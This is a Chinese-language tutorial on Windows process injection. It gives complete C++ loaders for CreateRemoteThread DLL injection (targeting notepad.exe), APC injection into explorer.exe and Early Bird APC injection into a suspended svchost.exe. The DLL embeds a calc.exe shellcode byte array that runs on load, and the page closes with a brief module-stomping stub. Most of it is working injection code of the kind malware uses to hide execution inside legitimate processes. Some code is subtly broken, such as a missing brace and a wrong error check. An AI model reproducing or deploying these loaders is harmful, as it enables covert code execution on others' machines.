# 进程注入



## CRT注入

**远程线程注入**是一种技术，它允许一个进程将自己的代码加载到另一个进程的地址空间，并在目标进程中执行。这种技术通常被用于实现一些特定的功能，例如注入 DLL（动态链接库）来修改或扩展目标进程的行为。

**DLL注入**，核心是通过CreateRemoteThread函数向一个正在运行的进程创建远程线程实现注入，注入的代码以动态链接库（DLL）的形式存在。

下面详解如何编写loader向其他进程注入dll文件。

#### **核心函数**

**CreateRemoteThread**                                                                                          

https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread

```c++
HANDLE CreateRemoteThread(
    HANDLE 							hProcess,	//进程句柄
    LPSECURITY_ATTRIBUTES lpThreadAttributes,	//null
    SIZE_T 						 dwStackSize,	//堆栈初始大小
    LPTHREAD_START_ROUTINE 	  lpStartAddress,	//线程函数地址
    LPVOID 						 lpParameter,	//线程函数（dll路径）
    DWORD 					 dwCreationFlags,	//控制线程创建的标志,为0立即执行
    LPDWORD 					  lpThreadId	//指向接收线程标识符的变量的指针，为null不返回线程标识符
);
```

lpStartAddress即线程函数，使用LoadLibrary的地址作为线程函数地址；

lpParameter为线程函数参数，使用dll路径作为参数



**VirtualAllocEx**
是在指定进程的虚拟空间保留或提交内存区域，除非指定MEM_RESET参数，否则将该内存区域置0。（简而言之是远程申请内存）

https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex

```c++
LPVOID VirtualAllocEx(
    HANDLE 		  hProcess,		//申请内存所在的进程句柄
    LPVOID 		 lpAddress,		//保留页面的内存地址；一般用NULL自动分配。
    SIZE_T 	  		dwSize,		//欲分配的内存大小，字节单位；注意实际分 配的内存大小是页内存大小的整数倍。
    DWORD flAllocationType,		
    DWORD 		 flProtect
);
```



**WriteProcessMemory**

https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

此函数能写入某一进程的内存区域（直接写入会出Access Violation错误），故需此函数入口区必须可以访问，否则操作将失败。

```c++
BOOL WriteProcessMemory(
  HANDLE  hProcess,         //进程句柄
  LPVOID  lpBaseAddress,    //写入的内存首地址
  LPCVOID lpBuffer,         //要写数据的指针
  SIZE_T  nSize,            //x
  SIZE_T  *lpNumberOfBytesWritten
);
```



#### 实现原理

使用`CreateRemoteThread`这个API，首先使用`CreateToolhelp32Snapshot`拍摄快照获取pid，然后使用`Openprocess`打开进程，使用`VirtualAllocEx`远程申请空间，使用`WriteProcessMemory`写入数据，再用`GetProcAddress`获取`LoadLibraryW`的地址（由于Windows引入了基址随机化ASLR安全机制,所以导致每次开机启动时系统DLL加载基址都不一样,有些系统dll(kernel,ntdll)的加载地址,允许每次启动基址可以改变,但是启动之后必须固定,也就是说两个不同进程在相互的虚拟内存中,这样的系统dll地址总是一样的），在注入进程中创建线程(`CreateRemoteThread`)



#### 实现代码

1.获取句柄进程：使用进程名获取pid

```c++
DWORD GetProcessPID(LPCTSTR lpProcessName)
{
    DWORD Ret = 0;
    PROCESSENTRY32 p32;
	HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (lpSnapshot == INVALID_HANDLE_VALUE)
    {
        printf("获取进程快照失败,请重试! Error:%d", ::GetLastError());
        return Ret;
    }
    p32.dwSize = sizeof(PROCESSENTRY32);
    ::Process32First(lpSnapshot, &p32);
    do {
        if (!lstrcmp(p32.szExeFile, lpProcessName))
            {
                Ret = p32.th32ProcessID;
                break;
            }
        } while (::Process32Next(lpSnapshot, &p32));
            ::CloseHandle(lpSnapshot);
    return Ret;
}
```

2.使用`OpenProcess`打开进程

```c++
hprocess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, _Pid);
```

3.使用`VirtualAllocEx`远程申请空间

```c++
pAllocMemory = ::VirtualAllocEx(hprocess, NULL, _Size, MEM_COMMIT, PAGE_READWRITE);
```

4.然后写入内存，使用`WriteProcessMemory`

```c++
Write = ::WriteProcessMemory(hprocess, pAllocMemory, DllName, _Size, NULL);
```

5.然后创建线程并等待线程函数结束，这里`WaitForSingleObject`的第二个参数要设置为-1才能够一直等待

```c++
//在另一个进程中创建线程
hThread = ::CreateRemoteThread(hprocess, NULL, 0, addr, pAllocMemory, 0, NULL);

//等待线程函数结束，获得退出码
WaitForSingleObject(hThread, -1);
GetExitCodeThread(hThread, &DllAddr);
```

完整代码

Loader.cpp

```c++
#include <iostream>
#include <tchar.h>
#include <windows.h>
#include <TlHelp32.h>

DWORD GetProcessPID(LPCTSTR lpProcessName)
{
    DWORD Ret = 0;
    PROCESSENTRY32 p32;
    HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (lpSnapshot == INVALID_HANDLE_VALUE)
    {
        printf("获取进程快照失败,请重试,error:%d", ::GetLastError());
        return Ret;
    }
    p32.dwSize = sizeof(PROCESSENTRY32);
    ::Process32First(lpSnapshot, &p32);
    do {
    	if (!lstrcmp(p32.szExeFile, lpProcessName))	
            {
            Ret = p32.th32ProcessID;
            break;
            }
    } while (::Process32Next(lpSnapshot, &p32));
        ::CloseHandle(lpSnapshot);
    return Ret;
}

DWORD RemoteThreadInject(DWORD Pid, LPCWSTR DllName)
{
    DWORD size = 0;
    DWORD DllAddr = 0;
    
    // 1.打开进程
    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
    if (hprocess == NULL)
    {
        printf("OpenProcess error!\n");
        return FALSE;
    }
    size = (wcslen(DllName) + 1) * sizeof(TCHAR);
    
    // 2.申请空间
    LPVOID pAllocMemory = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT,PAGE_READWRITE);
    if (pAllocMemory == NULL)
    {
        printf("VirtualAllocEx error!\n");
        return FALSE;
    }
    
    // 3.写入内存
    BOOL Write = WriteProcessMemory(hprocess, pAllocMemory, DllName, size,NULL);
    if (pAllocMemory == 0)
    {
        printf("WriteProcessMemory error!\n");
        return FALSE;
    

    // 4.获取LoadLibrary - kenrel32.dll
    FARPROC pThread = GetProcAddress(GetModuleHandle(L"kernel32.dll"),"LoadLibraryW");
    LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)pThread;
    
    // 5.创建线程
    HANDLE hThread = CreateRemoteThread(hprocess, NULL, 0, addr, pAllocMemory,0, NULL);
    if (hThread == NULL)
    {
    printf("CreateRemoteThread error!\n");
    return FALSE;
    }
    
    // 6.等待线程函数结束
    WaitForSingleObject(hThread, -1);
    // 7.释放DLL空间
    VirtualFreeEx(hprocess, pAllocMemory, size, MEM_DECOMMIT);
    // 8.关闭句柄
    CloseHandle(hprocess);
    return TRUE;
}

int main()
{
    DWORD PID = GetProcessPID(L"notepad.exe");
    RemoteThreadInject(PID, L"C:\\Users\\test\\Desktop\\x64.dll");
}
```

dllmain.cpp

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Calc.exe shellcode (exit function = thread)
unsigned char payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
unsigned int payload_len = 276;



extern __declspec(dllexport) int Go(void);
int Go(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	RtlMoveMemory(exec_mem, payload, payload_len);
	
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, 0);
	}
	return 0;
}


BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {

	switch ( fdwReason ) {
			case DLL_PROCESS_ATTACH:
					Go();
					break;
			case DLL_THREAD_ATTACH:
					break;
			case DLL_THREAD_DETACH:
					break;
			case DLL_PROCESS_DETACH:
					break;
			}
	return TRUE;
}

```



## APC注入

#### APC介绍

在Windows操作系统中，APC（Asynchronous Procedure Call，异步过程调用）机制是一种用于实现异步执行代码的机制。APC允许在指定的线程上执行用户定义的函数，而无需等待线程主动调用该函数。APC通常用于实现一些异步操作，如异步I/O、定时器、信号等。

以下是有关Windows APC机制的一些重要概念：

1. **异步过程调用（APC）：** APC是一种轻量级的机制，用于将函数的执行推迟到指定的线程上。这个函数可以是应用程序定义的回调函数。
2. **InsertAPC函数：** `QueueUserAPC`是用于将APC插入到目标线程的函数。通过调用`QueueUserAPC`，可以将一个函数关联到目标线程，使得在目标线程的执行流程中，当满足某些条件时，该函数会被异步调用。
3. **APC执行时机：** APC的执行时机由系统控制，通常是在目标线程的用户模式执行流程中某个特定点触发。例如，在线程进入或离开一个I/O操作时，或者在调用Sleep函数后，系统可能会检查是否有挂起的APC需要执行。
4. **APC回调函数：** 这是由应用程序提供的函数，将在APC触发时执行。回调函数的原型为`PAPCFUNC`，其定义为`VOID CALLBACK PAPCFUNC(ULONG_PTR Parameter)`。参数`Parameter`是一个用户定义的值，用于向回调函数传递额外的信息。
5. **KeInitializeApc函数：** 用于初始化一个APC对象。这个函数设置了APC的类型以及与之相关的一些属性。
6. **NtQueueApcThread函数：** 通过此函数可以直接将APC插入到目标线程。

APC机制在实现一些异步操作时非常有用，它允许程序在某个线程中异步执行一些代码，而不必等待该线程的主动调用。但要小心使用，因为不当的使用可能导致一些意外的行为。在多线程编程中，理解和正确使用APC机制是至关重要的。



#### 核心函数

**QueueUserAPC**

`QueueUserAPC` 是Windows操作系统提供的一个函数，用于将异步过程调用（APC）插入到指定线程的用户模式执行流程中。APC是一种轻量级的机制，允许在指定线程上执行用户定义的函数，而无需等待线程主动调用这个函数。`QueueUserAPC` 允许在特定线程上安排一个APC，从而在目标线程的执行流程中异步执行用户定义的代码。

以下是 `QueueUserAPC` 函数的详细介绍：

```cpp
BOOL QueueUserAPC(
  PAPCFUNC  pfnAPC,
  HANDLE    hThread,
  ULONG_PTR dwData
);
```

- `pfnAPC`: 指向用户定义的 APC 回调函数的指针。回调函数的原型为 `VOID CALLBACK PAPCFUNC(ULONG_PTR dwParam)`，其中 `dwParam` 是用户传递给 APC 的数据。

- `hThread`: 目标线程的句柄，表示将要执行 APC 的线程。

- `dwData`: 用户定义的数据，将被传递给 APC 回调函数。

**使用步骤：**

1. **定义回调函数：** 首先，需要定义一个符合 `PAPCFUNC` 原型的回调函数，用于执行异步的操作。

   ```cpp
   VOID CALLBACK MyAPCFunction(ULONG_PTR dwParam) {
       // 执行异步操作
   }
   ```

2. **初始化线程：** 在目标线程启动之前，需要确保线程已被创建，并且线程句柄有效。

3. **调用 `QueueUserAPC` 函数：** 在任何线程中，通过调用 `QueueUserAPC` 函数将回调函数插入到目标线程的执行流程中。

   ```cpp
   HANDLE hThread = // 获取目标线程的句柄
   ULONG_PTR dwData = // 用户定义的数据
   
   if (QueueUserAPC(MyAPCFunction, hThread, dwData)) {
       // 成功将 APC 插入到目标线程
   } else {
       // 插入失败，处理错误
   }
   ```

需要注意的是，`QueueUserAPC` 并不会立即执行 APC 回调函数，而是等待目标线程处于能够执行 APC 的状态时才执行。目标线程可能需要处于等待状态，或者执行某些特定的系统调用时，APC 才会被执行。

使用 `QueueUserAPC` 时需要谨慎，因为过度使用可能导致代码复杂性增加，同时要确保线程安全，以避免竞态条件和死锁。



#### 实现代码

```c++
#include <windows.h>
#include <tlhelp32.h>
#include <vector>



int main()
{
    // 1. 定义shellcode
    UINT shellcodeSize = 0;
    unsigned char* shellcode = "";

    // 2. 获取 explorer 进程句柄，分配 shellcode 的内存
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };

    if (Process32First(snapshot, &processEntry))
    {
        while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0)
        {
            Process32Next(snapshot, &processEntry);
        }
    }

    HANDLE victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 3. 执行 shellcode
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, shellcode, shellcodeSize, NULL);

    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    std::vector<DWORD> threadIds;

    if (Thread32First(snapshot, &threadEntry))
    {
        do {
            if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
            {
                threadIds.push_back(threadEntry.th32ThreadID);
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    for (DWORD threadId : threadIds)
    {
        HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
        QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
        Sleep(1000 * 2);
    }

    // 释放资源
    CloseHandle(victimProcess);
    CloseHandle(snapshot);

    return 0;
}

```



## Early Bird APC注入

"Early Bird" 是一种基于异步过程调用（APC）的注入技术，用于将代码注入到目标进程中执行。APC 是一种用于在目标线程上异步执行用户定义的代码的机制。"Early Bird" 的目标是在目标进程的线程启动前注入代码，实现更早的代码执行。

以下是 "Early Bird" APC 注入技术的基本流程：

1. **获取目标进程：**
   - 使用 `OpenProcess` 打开目标进程，获取进程句柄。
2. **分配内存：**
   - 使用 `VirtualAllocEx` 在目标进程的虚拟地址空间中分配一块内存，用于存储注入的代码。
3. **写入代码：**
   - 使用 `WriteProcessMemory` 将要注入的代码写入到目标进程的分配的内存中。
4. **获取目标线程：**
   - 使用工具函数（例如 `CreateToolhelp32Snapshot` 和 `Thread32First`）获取目标进程的线程列表。
5. **创建挂起的远程线程：**
   - 使用 `CreateRemoteThread` 创建一个远程线程，但是此时线程处于挂起状态（`CREATE_SUSPENDED` 标志）。
6. **将APC插入目标线程：**
   - 使用 `QueueUserAPC` 将异步过程调用（APC）插入到目标线程中。APC 的入口点即为目标代码的起始地址。
7. **恢复目标线程执行：**
   - 使用 `ResumeThread` 恢复目标线程的执行，使其开始执行注入的代码。

#### 实现代码

```c++
#include <windows.h>
#include <tchar.h>

int main() {
    // 1. 定义shellcode
    UINT shellcodeSize = 0;
    unsigned char* shellcode = "";

    // 2. 创建挂起的远程线程
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 3. 将APC插入目标线程并执行
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, shellcode, shellcodeSize, NULL);
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    ResumeThread(threadHandle);

    // 等待目标线程执行完毕
    WaitForSingleObject(threadHandle, INFINITE);

    // 释放资源
    CloseHandle(threadHandle);
    CloseHandle(victimProcess);

    return 0;
}

```



## Module  Stomping

模块踩踏是一种利用加载正常合法的 DLL 的技术，然后通过覆盖该 DLL 的部分内存来加载并执行 Shellcode 的方法。



